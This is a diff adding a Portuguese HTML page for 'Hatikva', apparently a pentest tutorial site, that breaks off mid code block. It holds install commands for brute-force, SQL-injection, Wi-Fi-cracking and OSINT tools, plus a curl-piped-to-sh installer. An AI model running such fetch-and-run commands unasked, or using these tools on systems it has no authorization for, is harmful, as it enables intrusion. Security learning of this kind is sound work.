@@ -1,0 +1,3613 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hatikva - Plataforma Completa de Segurança Cibernética</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --hatikva-blue: #0038b8;
+            --hatikva-blue-dark: #002a8f;
+            --hatikva-white: #ffffff;
+            --hatikva-accent: #d21034;
+            --hatikva-accent-light: #ff3355;
+            --hatikva-dark: #0a0e27;
+            --hatikva-light: #f0f2f8;
+            --code-bg: #1a1d2e;
+            --code-color: #f8f8f2;
+            --success-color: #00d084;
+            --info-color: #3b82f6;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1d2e 50%, #0a0e27 100%);
+            background-attachment: fixed;
+            color: var(--hatikva-light);
+            font-family: 'Rajdhani', sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background:
+                radial-gradient(circle at 20% 50%, rgba(0, 56, 184, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(210, 16, 52, 0.15) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container, .navbar, .sidebar, .content-card {
+            position: relative;
+            z-index: 1;
+        }
+
+        .grid-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image:
+                linear-gradient(rgba(0, 56, 184, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 56, 184, 0.05) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: gridMove 20s linear infinite;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        @keyframes gridMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(50px, 50px); }
+        }
+
+        .navbar {
+            background: linear-gradient(135deg, rgba(0, 56, 184, 0.95), rgba(0, 42, 143, 0.95));
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 30px rgba(0, 56, 184, 0.3);
+            padding: 0.8rem 1rem;
+            border-bottom: 2px solid rgba(210, 16, 52, 0.5);
+        }
+
+        .logo-text {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 900;
+            font-size: 1.8rem;
+            color: var(--hatikva-white);
+            text-shadow: 0 0 20px rgba(0, 56, 184, 0.8);
+            letter-spacing: 2px;
+        }
+
+        .israel-icon {
+            width: 32px;
+            height: 32px;
+            margin-right: 12px;
+            fill: var(--hatikva-accent);
+            filter: drop-shadow(0 0 10px rgba(210, 16, 52, 0.8));
+            animation: starPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes starPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .nav-link {
+            color: var(--hatikva-white) !important;
+            font-weight: 600;
+            font-size: 1.05rem;
+            transition: all 0.3s ease;
+            position: relative;
+            padding: 0.5rem 1rem !important;
+            cursor: pointer;
+        }
+
+        .nav-link::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            width: 0;
+            height: 2px;
+            background: var(--hatikva-accent);
+            transition: all 0.3s ease;
+            transform: translateX(-50%);
+        }
+
+        .nav-link:hover {
+            color: var(--hatikva-accent-light) !important;
+            transform: translateY(-2px);
+        }
+
+        .nav-link:hover::after {
+            width: 80%;
+        }
+
+        .sidebar {
+            background: linear-gradient(135deg, rgba(26, 29, 46, 0.95), rgba(10, 14, 39, 0.95));
+            backdrop-filter: blur(15px);
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 56, 184, 0.2);
+            padding: 25px;
+            position: sticky;
+            top: 20px;
+            max-height: calc(100vh - 40px);
+            overflow-y: auto;
+            border: 1px solid rgba(0, 56, 184, 0.3);
+        }
+
+        .sidebar::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .sidebar::-webkit-scrollbar-track {
+            background: rgba(0, 56, 184, 0.1);
+            border-radius: 10px;
+        }
+
+        .sidebar::-webkit-scrollbar-thumb {
+            background: var(--hatikva-accent);
+            border-radius: 10px;
+        }
+
+        .sidebar-title {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--hatikva-accent-light);
+            border-bottom: 3px solid var(--hatikva-accent);
+            padding-bottom: 12px;
+            margin-bottom: 25px;
+            font-weight: 700;
+            font-size: 1.4rem;
+            text-shadow: 0 0 10px rgba(210, 16, 52, 0.5);
+        }
+
+        .menu-section {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            color: var(--hatikva-blue);
+            margin-top: 20px;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid rgba(0, 56, 184, 0.3);
+            font-size: 0.95rem;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .sidebar-item {
+            padding: 14px 18px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            cursor: pointer;
+            border-left: 3px solid transparent;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 500;
+            font-size: 1.05rem;
+            background: rgba(0, 56, 184, 0.05);
+        }
+
+        .sidebar-item i {
+            font-size: 1.2rem;
+            transition: transform 0.3s ease;
+        }
+
+        .sidebar-item:hover {
+            background: linear-gradient(90deg, rgba(0, 56, 184, 0.2), rgba(210, 16, 52, 0.1));
+            border-left: 3px solid var(--hatikva-accent);
+            transform: translateX(8px);
+            box-shadow: 0 4px 15px rgba(0, 56, 184, 0.3);
+        }
+
+        .sidebar-item:hover i {
+            transform: scale(1.2);
+            color: var(--hatikva-accent-light);
+        }
+
+        .sidebar-item.active {
+            background: linear-gradient(90deg, rgba(0, 56, 184, 0.3), rgba(210, 16, 52, 0.2));
+            border-left: 3px solid var(--hatikva-accent);
+            font-weight: 700;
+            color: var(--hatikva-white);
+            box-shadow: 0 4px 20px rgba(210, 16, 52, 0.4);
+        }
+
+        .content-card {
+            background: linear-gradient(135deg, rgba(26, 29, 46, 0.95), rgba(10, 14, 39, 0.95));
+            backdrop-filter: blur(15px);
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            padding: 30px;
+            margin-bottom: 30px;
+            border-top: 4px solid var(--hatikva-accent);
+            border: 1px solid rgba(0, 56, 184, 0.3);
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .content-title {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--hatikva-accent-light);
+            margin-bottom: 25px;
+            font-weight: 900;
+            font-size: 2rem;
+            text-shadow: 0 0 20px rgba(210, 16, 52, 0.5);
+        }
+
+        .content-card h2 {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--info-color);
+            margin-top: 30px;
+            margin-bottom: 20px;
+            font-weight: 700;
+            font-size: 1.5rem;
+        }
+
+        .content-card h3 {
+            color: #60a5fa;
+            margin-top: 25px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .content-card p, .content-card li {
+            line-height: 1.8;
+            font-size: 1.05rem;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .platform-badge, .difficulty-badge, .status-badge {
+            color: white;
+            padding: 8px 16px;
+            border-radius: 25px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .platform-badge {
+            background: linear-gradient(135deg, var(--hatikva-accent), var(--hatikva-accent-light));
+        }
+
+        .difficulty-badge {
+            background: linear-gradient(135deg, var(--hatikva-blue), #3b82f6);
+        }
+
+        .status-badge {
+            background: linear-gradient(135deg, var(--success-color), #00ff9f);
+        }
+
+        .code-block {
+            background: var(--code-bg);
+            color: var(--code-color);
+            border-radius: 10px;
+            padding: 20px 60px 20px 40px;
+            margin: 20px 0;
+            font-family: 'Courier New', Courier, monospace;
+            position: relative;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+            border: 1px solid rgba(0, 56, 184, 0.3);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            font-size: 0.95rem;
+        }
+
+        .code-block::before {
+            content: '❯';
+            position: absolute;
+            left: 15px;
+            top: 20px;
+            color: var(--hatikva-accent);
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: linear-gradient(135deg, var(--hatikva-accent), var(--hatikva-accent-light));
+            border: none;
+            color: white;
+            border-radius: 6px;
+            padding: 6px 14px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .copy-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 4px 20px rgba(210, 16, 52, 0.5);
+        }
+
+        .warning-box, .disclaimer, .info-box, .success-box {
+            padding: 18px;
+            margin: 25px 0;
+            border-radius: 8px;
+            font-weight: 500;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            border-left: 4px solid;
+            font-size: 1.05rem;
+        }
+
+        .warning-box {
+            background: linear-gradient(90deg, rgba(255, 193, 7, 0.15), rgba(255, 193, 7, 0.05));
+            border-left-color: #ffc107;
+            color: #ffd54f;
+        }
+
+        .disclaimer {
+            background: linear-gradient(90deg, rgba(210, 16, 52, 0.2), rgba(210, 16, 52, 0.05));
+            border-left-color: var(--hatikva-accent);
+            color: #ff6b9d;
+            font-weight: 600;
+        }
+
+        .info-box {
+            background: linear-gradient(90deg, rgba(59, 130, 246, 0.15), rgba(59, 130, 246, 0.05));
+            border-left-color: var(--info-color);
+            color: #60a5fa;
+        }
+
+        .success-box {
+            background: linear-gradient(90deg, rgba(0, 208, 132, 0.15), rgba(0, 208, 132, 0.05));
+            border-left-color: var(--success-color);
+            color: #4ade80;
+        }
+
+        .btn {
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            padding: 12px 24px;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            border: none;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--hatikva-blue), #3b82f6);
+            box-shadow: 0 4px 15px rgba(0, 56, 184, 0.4);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(0, 56, 184, 0.6);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, var(--success-color), #00ff9f);
+            color: var(--hatikva-dark);
+            box-shadow: 0 4px 15px rgba(0, 208, 132, 0.4);
+        }
+
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(0, 208, 132, 0.6);
+        }
+
+        .btn-outline-primary {
+            border: 2px solid var(--hatikva-blue);
+            color: var(--hatikva-blue);
+            background: transparent;
+        }
+
+        .btn-outline-primary:hover {
+            background: var(--hatikva-blue);
+            color: white;
+            transform: translateY(-2px);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+
+        .stat-card {
+            background: linear-gradient(135deg, rgba(0, 56, 184, 0.2), rgba(210, 16, 52, 0.1));
+            border-radius: 12px;
+            padding: 25px;
+            text-align: center;
+            border: 1px solid rgba(0, 56, 184, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 30px rgba(0, 56, 184, 0.4);
+        }
+
+        .stat-number {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            font-weight: 900;
+            color: var(--hatikva-accent-light);
+            text-shadow: 0 0 20px rgba(210, 16, 52, 0.5);
+        }
+
+        .stat-label {
+            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.7);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 8px;
+        }
+
+        .tutorial-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+
+        .tutorial-card {
+            background: linear-gradient(135deg, rgba(26, 29, 46, 0.9), rgba(10, 14, 39, 0.9));
+            border-radius: 12px;
+            padding: 25px;
+            border: 1px solid rgba(0, 56, 184, 0.3);
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .tutorial-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 12px 40px rgba(0, 56, 184, 0.4);
+            border-color: var(--hatikva-accent);
+        }
+
+        .tutorial-icon {
+            font-size: 3rem;
+            color: var(--hatikva-accent-light);
+            margin-bottom: 15px;
+            text-shadow: 0 0 15px rgba(210, 16, 52, 0.5);
+        }
+
+        .tutorial-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--hatikva-white);
+            margin-bottom: 12px;
+        }
+
+        .tutorial-description {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 1rem;
+            line-height: 1.6;
+        }
+
+        .tool-card {
+            background: linear-gradient(135deg, rgba(26, 29, 46, 0.8), rgba(10, 14, 39, 0.8));
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid rgba(0, 56, 184, 0.3);
+            transition: all 0.3s ease;
+            margin-bottom: 15px;
+        }
+
+        .tool-card:hover {
+            border-color: var(--hatikva-accent);
+            transform: translateX(5px);
+            box-shadow: 0 4px 20px rgba(0, 56, 184, 0.3);
+        }
+
+        .tool-name {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--hatikva-accent-light);
+            margin-bottom: 8px;
+        }
+
+        .tool-description {
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 10px;
+        }
+
+        .section-hidden {
+            display: none;
+        }
+
+        .footer {
+            background: linear-gradient(135deg, rgba(0, 56, 184, 0.95), rgba(0, 42, 143, 0.95));
+            backdrop-filter: blur(10px);
+            color: var(--hatikva-white);
+            padding: 30px 0;
+            margin-top: 60px;
+            border-top: 2px solid var(--hatikva-accent);
+            box-shadow: 0 -4px 30px rgba(0, 56, 184, 0.3);
+        }
+
+        .hebrew-text {
+            font-family: 'Times New Roman', serif;
+            font-size: 1.5rem;
+            color: var(--hatikva-accent-light);
+            text-shadow: 0 0 10px rgba(210, 16, 52, 0.5);
+        }
+
+        .social-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--hatikva-white);
+            text-decoration: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            background: rgba(0, 56, 184, 0.2);
+            transition: all 0.3s ease;
+            margin-right: 10px;
+            margin-bottom: 10px;
+        }
+
+        .social-link:hover {
+            background: var(--hatikva-accent);
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(210, 16, 52, 0.4);
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, rgba(26, 29, 46, 0.98), rgba(10, 14, 39, 0.98));
+            border: 1px solid rgba(0, 56, 184, 0.5);
+            border-radius: 15px;
+            color: var(--hatikva-light);
+        }
+
+        .modal-header {
+            border-bottom: 1px solid rgba(0, 56, 184, 0.3);
+        }
+
+        .modal-footer {
+            border-top: 1px solid rgba(0, 56, 184, 0.3);
+        }
+
+        @media (max-width: 991.98px) {
+            .sidebar {
+                position: relative;
+                max-height: none;
+                margin-bottom: 25px;
+            }
+
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .tutorial-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .logo-text {
+                font-size: 1.4rem;
+            }
+
+            .content-title {
+                font-size: 1.5rem;
+            }
+
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="grid-background"></div>
+
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container">
+            <a class="navbar-brand d-flex align-items-center" href="#" onclick="navigateTo('home')">
+                <svg class="israel-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
+                    <polygon points="32 4 39.1 22.9 59.5 22.9 42.2 35.1 49.3 54 32 41.8 14.7 54 21.8 35.1 4.5 22.9 24.9 22.9 32 4"/>
+                </svg>
+                <span class="logo-text">HATIKVA</span>
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" onclick="navigateTo('home')"><i class="fas fa-home me-1"></i> Início</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" onclick="navigateTo('quickstart')"><i class="fas fa-rocket me-1"></i> Quick Start</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" onclick="navigateTo('tutorials')"><i class="fas fa-book me-1"></i> Tutoriais</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" onclick="navigateTo('tools')"><i class="fas fa-tools me-1"></i> Ferramentas</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" onclick="navigateTo('defense')"><i class="fas fa-shield-alt me-1"></i> Defesa</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" onclick="navigateTo('legal')"><i class="fas fa-balance-scale me-1"></i> Legal</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container my-4">
+        <section class="disclaimer">
+            <i class="fas fa-exclamation-triangle fa-2x"></i>
+            <div>
+                <strong>AVISO LEGAL IMPORTANTE:</strong>
+                <span>Este guia é destinado exclusivamente para fins educacionais e de segurança defensiva. Use estas ferramentas apenas em sistemas que você possui ou tem autorização explícita e documentada para testar. O uso inadequado pode violar leis federais e locais, incluindo a Lei Carolina Dieckmann (Lei 12.737/2012) e o Marco Civil da Internet.</span>
+            </div>
+        </section>
+
+        <div class="row">
+            <nav class="col-lg-3 mb-4 sidebar">
+                <h2 class="sidebar-title">🧭 Navegação</h2>
+
+                <div class="menu-section">Início Rápido</div>
+                <ul class="list-unstyled">
+                    <li class="sidebar-item active" onclick="navigateTo('home')">
+                        <i class="fas fa-tachometer-alt"></i> Dashboard
+                    </li>
+                    <li class="sidebar-item" onclick="navigateTo('quickstart')">
+                        <i class="fas fa-bolt"></i> Quick Start
+                    </li>
+                </ul>
+
+                <div class="menu-section">Plataformas</div>
+                <ul class="list-unstyled">
+                    <li class="sidebar-item" onclick="navigateTo('termux')">
+                        <i class="fas fa-mobile-alt"></i> Termux
+                    </li>
+                    <li class="sidebar-item" onclick="navigateTo('linux')">
+                        <i class="fas fa-terminal"></i> Linux
+                    </li>
+                </ul>
+
+                <div class="menu-section">Técnicas</div>
+                <ul class="list-unstyled">
+                    <li class="sidebar-item" onclick="navigateTo('osint')">
+                        <i class="fas fa-search"></i> OSINT
+                    </li>
+                    <li class="sidebar-item" onclick="navigateTo('bruteforce')">
+                        <i class="fas fa-hammer"></i> Força Bruta
+                    </li>
+                    <li class="sidebar-item" onclick="navigateTo('sql')">
+                        <i class="fas fa-database"></i> SQL Injection
+                    </li>
+                    <li class="sidebar-item" onclick="navigateTo('xss')">
+                        <i class="fas fa-code"></i> XSS
+                    </li>
+                    <li class="sidebar-item" onclick="navigateTo('network')">
+                        <i class="fas fa-network-wired"></i> Rede
+                    </li>
+                    <li class="sidebar-item" onclick="navigateTo('wireless')">
+                        <i class="fas fa-wifi"></i> Wireless
+                    </li>
+                </ul>
+
+                <div class="menu-section">Ferramentas</div>
+                <ul class="list-unstyled">
+                    <li class="sidebar-item" onclick="navigateTo('tools')">
+                        <i class="fas fa-toolbox"></i> Todas as Ferramentas
+                    </li>
+                </ul>
+
+                <div class="menu-section">Recursos</div>
+                <ul class="list-unstyled">
+                    <li class="sidebar-item" onclick="navigateTo('templates')">
+                        <i class="fas fa-download"></i> Templates & Payloads
+                    </li>
+                    <li class="sidebar-item" onclick="navigateTo('cheatsheet')">
+                        <i class="fas fa-book-open"></i> Cheat Sheets
+                    </li>
+                </ul>
+            </nav>
+
+            <article class="col-lg-9" id="mainContent">
+                <!-- HOME -->
+                <div id="section-home">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-chart-line me-3"></i>Dashboard Hatikva</h1>
+                        <div class="stats-grid">
+                            <div class="stat-card">
+                                <div class="stat-number">100+</div>
+                                <div class="stat-label">Tutoriais</div>
+                            </div>
+                            <div class="stat-card">
+                                <div class="stat-number">75+</div>
+                                <div class="stat-label">Ferramentas</div>
+                            </div>
+                            <div class="stat-card">
+                                <div class="stat-number">12</div>
+                                <div class="stat-label">Técnicas</div>
+                            </div>
+                            <div class="stat-card">
+                                <div class="stat-number">2</div>
+                                <div class="stat-label">Plataformas</div>
+                            </div>
+                        </div>
+
+                        <div class="info-box">
+                            <i class="fas fa-shield-alt fa-2x"></i>
+                            <div>
+                                <strong>Bem-vindo ao Hatikva Security Platform!</strong>
+                                Plataforma completa de cibersegurança focada em Termux (Android) e Linux. Tutoriais práticos e ferramentas essenciais para segurança defensiva e testes éticos.
+                            </div>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-fire me-2"></i>Comece Aqui</h2>
+                        <div class="tutorial-grid">
+                            <div class="tutorial-card" onclick="navigateTo('quickstart')">
+                                <div class="tutorial-icon"><i class="fas fa-rocket"></i></div>
+                                <div class="tutorial-title">Quick Start</div>
+                                <div class="tutorial-description">Primeiros passos para configurar seu ambiente de pentest.</div>
+                            </div>
+                            <div class="tutorial-card" onclick="navigateTo('termux')">
+                                <div class="tutorial-icon"><i class="fas fa-mobile-alt"></i></div>
+                                <div class="tutorial-title">Termux Android</div>
+                                <div class="tutorial-description">Configuração completa do Termux para segurança.</div>
+                            </div>
+                            <div class="tutorial-card" onclick="navigateTo('linux')">
+                                <div class="tutorial-icon"><i class="fas fa-terminal"></i></div>
+                                <div class="tutorial-title">Linux</div>
+                                <div class="tutorial-description">Ambiente Linux para pentest profissional.</div>
+                            </div>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-graduation-cap me-2"></i>Tutoriais em Destaque</h2>
+                        <div class="tutorial-grid">
+                            <div class="tutorial-card" onclick="navigateTo('osint')">
+                                <div class="tutorial-icon"><i class="fas fa-search"></i></div>
+                                <div class="tutorial-title">OSINT Básico</div>
+                                <div class="tutorial-description">Coleta de informações em fontes abertas.</div>
+                            </div>
+                            <div class="tutorial-card" onclick="navigateTo('network')">
+                                <div class="tutorial-icon"><i class="fas fa-network-wired"></i></div>
+                                <div class="tutorial-title">Análise de Rede</div>
+                                <div class="tutorial-description">Scanning e enumeração de redes.</div>
+                            </div>
+                            <div class="tutorial-card" onclick="navigateTo('wireless')">
+                                <div class="tutorial-icon"><i class="fas fa-wifi"></i></div>
+                                <div class="tutorial-title">WiFi Security</div>
+                                <div class="tutorial-description">Auditoria de redes sem fio.</div>
+                            </div>
+                            <div class="tutorial-card" onclick="navigateTo('cheatsheet')">
+                                <div class="tutorial-icon"><i class="fas fa-book-open"></i></div>
+                                <div class="tutorial-title">Cheat Sheets</div>
+                                <div class="tutorial-description">Comandos essenciais para consulta rápida.</div>
+                            </div>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- QUICKSTART -->
+                <div id="section-quickstart" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-rocket me-3"></i>Quick Start</h1>
+
+                        <h2><i class="fas fa-desktop me-2"></i>Escolha sua Plataforma</h2>
+                        <div class="tutorial-grid">
+                            <div class="tutorial-card" onclick="navigateTo('termux')">
+                                <div class="tutorial-icon"><i class="fas fa-mobile-alt"></i></div>
+                                <div class="tutorial-title">Termux</div>
+                                <div class="tutorial-description">Android - Pentest móvel</div>
+                                <span class="difficulty-badge mt-2">Iniciante</span>
+                            </div>
+                            <div class="tutorial-card" onclick="navigateTo('linux')">
+                                <div class="tutorial-icon"><i class="fas fa-terminal"></i></div>
+                                <div class="tutorial-title">Linux</div>
+                                <div class="tutorial-description">Ambiente completo</div>
+                                <span class="difficulty-badge mt-2">Avançado</span>
+                            </div>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-terminal me-2"></i>Instalação Rápida</h2>
+
+                        <h3>Termux (Android)</h3>
+                        <pre class="code-block">pkg update && pkg upgrade -y
+pkg install python git nmap hydra sqlmap -y
+pkg install wget curl nano vim -y
+termux-setup-storage<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Linux - Kali/Debian</h3>
+                        <pre class="code-block">sudo apt update && sudo apt upgrade -y
+sudo apt install nmap wireshark metasploit-framework -y
+sudo apt install aircrack-ng john hashcat -y
+sudo apt install python3 python3-pip git -y<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <div class="warning-box">
+                            <i class="fas fa-exclamation-triangle"></i>
+                            <div>
+                                <strong>Nota:</strong> No Termux, algumas ferramentas podem precisar de compilação manual. No Linux, recomenda-se usar distribuições especializadas como Kali ou Parrot para ter todas as ferramentas pré-instaladas.
+                            </div>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-cogs me-2"></i>Configurações Iniciais</h2>
+
+                        <h3>Termux - Personalização</h3>
+                        <pre class="code-block"># Instalar ZSH e personalizar
+pkg install zsh -y
+chsh -s zsh
+sh -c "$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)"
+
+# Aliases úteis
+echo "alias ll='ls -la'" >> ~/.zshrc
+echo "alias update='pkg update && pkg upgrade'" >> ~/.zshrc
+echo "alias scan='nmap -A -T4'" >> ~/.zshrc
+source ~/.zshrc<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Linux - Aliases Essenciais</h3>
+                        <pre class="code-block"># Adicionar ao ~/.bashrc ou ~/.zshrc
+alias scan='sudo nmap -A -T4'
+alias ports='sudo netstat -tulpn'
+alias update='sudo apt update && sudo apt upgrade -y'
+alias install='sudo apt install -y'
+
+# Para Kali específico
+alias msf='service postgresql start && msfconsole'<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <div class="d-flex justify-content-between mt-4 flex-wrap gap-3">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                            <button class="btn btn-primary" onclick="navigateTo('termux')">
+                                Ir para Termux <i class="fas fa-arrow-right ms-1"></i>
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- TERMUX -->
+                <div id="section-termux" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-mobile-alt me-3"></i>Termux Android</h1>
+
+                        <div class="info-box">
+                            <i class="fas fa-info-circle fa-2x"></i>
+                            <div>
+                                <strong>Termux é um emulador de terminal para Android</strong> que permite usar Linux sem root. Ambiente ideal para aprender e fazer testes básicos de segurança.
+                            </div>
+                        </div>
+
+                        <h2><i class="fas fa-download me-2"></i>Instalação Básica</h2>
+                        <pre class="code-block"># Atualizar sempre primeiro
+pkg update && pkg upgrade -y
+
+# Ferramentas essenciais
+pkg install python python2 python3 -y
+pkg install git wget curl nano vim -y
+pkg install clang make cmake -y
+
+# Ferramentas de rede
+pkg install nmap netcat-openbsd dnsutils whois -y
+pkg install hydra sqlmap -y
+
+# Acesso ao armazenamento
+termux-setup-storage<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-tools me-2"></i>Instalação de Ferramentas Específicas</h2>
+
+                        <h3>Ferramentas OSINT</h3>
+                        <pre class="code-block"># theHarvester
+git clone https://github.com/laramies/theHarvester.git
+cd theHarvester
+python3 -m pip install -r requirements.txt
+
+# Sherlock
+git clone https://github.com/sherlock-project/sherlock.git
+cd sherlock
+python3 -m pip install -r requirements.txt
+
+# PhoneInfoga (rastreamento de números)
+git clone https://github.com/sundowndev/PhoneInfoga.git
+cd PhoneInfoga
+pip3 install -r requirements.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Segurança Web</h3>
+                        <pre class="code-block"># SQLMap (já instalado via pkg)
+sqlmap --version
+
+# Nikto
+git clone https://github.com/sullo/nikto.git
+cd nikto
+
+# Dirsearch
+git clone https://github.com/maurosoria/dirsearch.git
+cd dirsearch
+
+# XSStrike
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip3 install -r requirements.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Força Bruta & Cracking</h3>
+                        <pre class="code-block"># Hydra (já instalado)
+hydra
+
+# John the Ripper
+pkg install john -y
+
+# Hashcat (versão CPU)
+pkg install hashcat -y
+
+# Crunch (gerador de wordlists)
+pkg install crunch -y<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-wifi me-2"></i>WiFi no Termux</h2>
+                        <pre class="code-block"># Aircrack-ng suite
